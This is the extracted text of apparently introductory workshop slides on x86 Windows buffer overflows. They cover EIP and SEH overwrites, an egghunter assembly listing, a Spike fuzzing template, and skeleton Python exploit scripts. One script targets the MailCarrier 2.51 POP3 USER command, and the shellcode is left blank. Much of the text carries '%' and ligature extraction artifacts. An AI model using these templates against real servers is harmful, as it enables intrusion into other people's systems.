Hack%to%Basics%–%x86%Windows%Based%Buﬀer%Overﬂows,%an%introduc:on%to%buﬀer%overﬂows%
Instructor%-%Dino%Covotsos%– Telspace%Systems%
Co–Instructor%–%Manuel%Corregedor%
@telspacesystems%
Whoami'(x2)'?'
We%work%in%the%Penetra:on%Tes:ng%space%(Telspace%Systems)%
%
Approximately%20%years%in%
%
Trying%to%keep%some%sort%of%work/life%balance!%;)%
%
Various%qualiﬁca:ons,%degrees%etc%
Agenda'
-%Introduc:on%to%the%workshop(We%are%here!).%
-%The%Stack%and%Registers.%
-%Basic%x86%ASM.%
-%Basic%exploita:on%techniques.%
-%Fuzzing.%
-%Introduc:on%to%variety%of%Skeleton%Python%scripts(copy%
paste%buﬀer%overﬂows,%remote%buﬀer%overﬂows%etc).%
Agenda'
-%Vanilla%EIP%overwrites%in%Immunity%Debugger.%
-%Overwri:ng%EIP,%Jumping%to%ESP,%execu:ng%Shellcode%
(generated%by%Metasploit%or%compiled%from%exploit-db/
shellstorm).%
-%Bad%characters%and%how%to%deal%with%them.%
-%Prac:cal%example.%
Agenda'
-%Introduc:on%to%SEH%exploita:on%techniques.%
-%Introduc:on%to%Mona,%basic%asm%jumps%and%shell%coding.%
-%Prac:cal%examples.%
Agenda'
-%What%are%egg%hunters?%%
-%Example%of%a%egg%hunter%being%u:lised%in%a%SEH%exploit.%
-%Ques:ons%and%Answers.%%
-%References.%
The%Stack%and%Registers(x86)%
The%8%32%bit%General%Purpose%Registers:%
%
Accumulator%register%(AX).%Used%in%arithme:c%opera:ons%
Counter%register%(CX).%Used%in%shid/rotate%instruc:ons%and%loops.%
Data%register%(DX).%Used%in%arithme:c%opera:ons%and%I/O%opera:ons.%
Base%register%(BX).%Used%as%a%pointer%to%data%(located%in%segment%register%DS,%when%in%
segmented%mode).%
Stack%Pointer%register%(SP).%Pointer%to%the%top%of%the%stack.%
Stack%Base%Pointer%register%(BP).%Used%to%point%to%the%base%of%the%stack.%
Source%Index%register%(SI).%Used%as%a%pointer%to%a%source%in%stream%opera:ons.%
Des:na:on%Index%register%(DI).%Used%as%a%pointer%to%a%des:na:on%in%stream%opera:ons.%
The%Stack%and%Registers(x86)%
REF:%hep://ﬂint.cs.yale.edu/cs421/papers/x86-asm/asm.html%
Basic%x86%ASM%
X86%ASM%(for%this%workshop):%
%
add/sub%
xor%
mov%
push%
pop%
call%
jmp%(and%condi:onal%jumps)%
%
%Basic%exploita:on%techniques%
“Vanilla”'EIP'Overwrite:'
%
Direct%EIP%overwrite%with%ini:al%long%buﬀer(no%excep:on%handler%or%similar)%
%
Structured'ExcepGon'Handling(SEH)'exploitaGon:'
%
An%excep:on%is%an%event%that%occurs%during%the%execu:on%of%a%program,%and%requires%
the%execu:on%of%code%outside%the%normal%ﬂow%of%control.%Structured%excep:on%
handling%is%a%mechanism%for%handling%both%hardware%and%sodware%excep:ons.%%
%
Overwrite%SEH%with%a%POP%POP%RET%instruc:on,%ESP%moved%towards%higher%instruc:ons%
twice%then%a%RET%is%executed.%
REF:%heps://docs.microsod.com/en-us/windows/desktop/debug/structured-excep:on-handling%
%Basic%exploita:on%techniques%
Structured'ExcepGon'Handling(SEH)'exploitaGon(conGnued):'
'
Typical%structure:%
%
“A”%buﬀer%+%(Next%SEH)/JMP%+%PPR%+%(nops)%+%shellcode%
%Basic%exploita:on%techniques%
Egghunters:'
'
A%egghunter%is%a%small%piece%of%shellcode%that%searches%memory%for%a%larger,%bigger%
shellcode%where%it%may%be%possible%to%execute%said%shellcode%(i.e.%in%cases%where%there%
is%only%a%small%amount%of%space%available%in%the%buﬀer,%this%is%very%useful)%
%
Egghunters%search%for%a%“TAG”%which%is%a%unique%4%byte%string,%in%memory.%We%then%
combine%a%string%together%so%that%it%is%unique,%such%as%WOOTWOOT%or%similar%where%
we%want%to%execute%our%actual%shellcode%once%found(i.e.%we%redirect%execu:on%ﬂow).%
%Basic%exploita:on%techniques%
Egghunters,'example:'
'
loop_inc_page:%
or    dx, 0x0fff                    // Add PAGE_SIZE-1 to edx
loop_inc_one:%
inc   edx                           // Increment our pointer by one
loop_check:%
push  edx                           // Save edx
push  0x2                           // Push NtAccessCheckAndAuditAlarm
pop   eax                           // Pop into eax
int   0x2e                          // Perform the syscall
cmp   al, 0x05                      // Did we get 0xc0000005 (ACCESS_VIOLATION) ?
pop   edx                           // Restore edx
loop_check_8_valid:%%
%je%%%%loop_inc_page%%%%%%%%%%%%%%%%%//%Yes,%invalid%ptr,%go%to%the%next%page%
%
is_egg:%
%mov%%%eax,%0x50905090%%%%%%%%%%%%%%%//%Throw%our%egg%in%eax%
%mov%%%edi,%edx%%%%%%%%%%%%%%%%%%%%%%//%Set%edi%to%the%pointer%we%validated%
%scasd%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%//%Compare%the%dword%in%edi%to%eax%
%jnz%%%loop_inc_one%%%%%%%%%%%%%%%%%%//%No%match?%Increment%the%pointer%by%one%
%scasd%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%//%Compare%the%dword%in%edi%to%eax%again%(which%is%now%edx%+%4)%
%jnz%%%loop_inc_one%%%%%%%%%%%%%%%%%%//%No%match?%Increment%the%pointer%by%one%
%
matched:%
%jmp%%%edi%%%%%%%%%%%%%%%%%%%%%%%%%%%//%Found%the%egg.%%Jump%8%bytes%past%it%into%our%code.'
REF:%hep://www.hick.org/code/skape/papers/egghunt-shellcode.pdf%%&%heps://www.fuzzysecurity.com/tutorials/expDev/4.html%%
Fuzzing%
Google'DeﬁniGon:'
%
Fuzzing%or%fuzz%tes:ng%is%an%automated%sodware%tes:ng%technique%that%involves%
providing%invalid,%unexpected,%or%random%data%as%inputs%to%a%computer%program.%The%
program%is%then%monitored%for%excep:ons%such%as%crashes,%failing%built-in%code%
asser:ons,%or%poten:al%memory%leaks.%
'
Manual'TesGng'(GeneraGon,'mutaGon,'manual'coding'etc)'
'
Tools:'Spike,'Boofuzz,'Peach,'Sulley'etc'
Fuzzing%
Basic%Spike%Template:%
'
s_string_variable("USER");%
s_string(" ");
s_string_variable(”FOO");%
s_string("\r\n");
s_string("PASS%");%
s_string_variable(”F00");%
s_string_variable("\r\n");%
%
Skeleton%Python%Scripts%
On%your%USB/VM%there%are%addi:onal%scripts:%
'
Copy/Paste'Skeleton'Python'Scripts'(Local'BOF'example,'SEH)'
'
Shellcode = “” 
buffer = "A" * 884 + NSEH + SEH" + NOPS + shellcode + "D" * 8868 
payload = buffer 
try: 
    f=open("exploit.txt","w") 
    print "[+] Creating %s bytes payload.." %len(payload) 
    f.write(payload) 
    f.close() 
    print "[+] File created!" 
except: 
    print "File cannot be created” 
'
Skeleton%Python%Scripts%
Socket'Based'Skeleton'Python'Scripts'(Local'BOF'example,'Vanilla)'
'
buffer = "A" * 5094 + ”JMP ESP" + NOPS + "C" * (882-len(shellcode)) 
print "[*] MailCarrier 2.51 POP3 Buffer Overflow in USER command\r\n" 
print "[*] Sending pwnage buffer: with %s bytes..." %len(buffer) 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
connect=s.connect(("192.168.0.150", 110)) 
print s.recv(1024) 
s.send('USER ' + buffer + '\r\n') 
print s.recv(1024) 
s.send('QUIT\r\n') 
s.close() 
time.sleep(1) 
print "[*] Done, but if you get here the exploit failed!" 
Vanilla%EIP%Overwrite%
'41414141'–'The'Magic'Numbers.'